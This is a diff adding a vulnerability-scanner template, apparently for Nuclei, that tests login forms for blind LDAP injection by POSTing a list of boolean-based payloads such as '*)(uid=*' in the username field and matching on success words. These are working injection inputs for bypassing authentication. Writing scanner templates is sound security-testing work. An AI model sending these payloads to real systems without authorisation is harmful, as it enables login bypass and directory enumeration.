@@ -1,0 +1,42 @@
+# templates/ldap-injection/ldap-injection-blind.yaml
+id: ldap-injection-blind
+info:
+  name: Blind LDAP Injection Detection
+  author: webx-elite
+  severity: high
+  description: Tests for blind LDAP injection vulnerabilities using boolean-based techniques
+  tags:
+    - ldap-injection
+    - blind
+    - boolean-based
+  classification:
+    cwe-id: CWE-90
+
+vulnerability_type: ldap-injection
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username={{blind_payload}}&password=test"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'success') || contains(body, 'login') || contains(body, 'welcome')"
+          - "status_code == 200"
+        condition: and
+
+payloads:
+  # Boolean-based blind injection
+  - "admin)(&(objectClass=*"
+  - "admin)(&(objectClass=user"
+  - "admin)(&(cn=a*"
+  - "admin)(&(cn=admin*"
+  - "*)(objectClass=*"
+  - "*)(uid=*"
+  - "*)(cn=*"
+  
+encoders:
+  - url
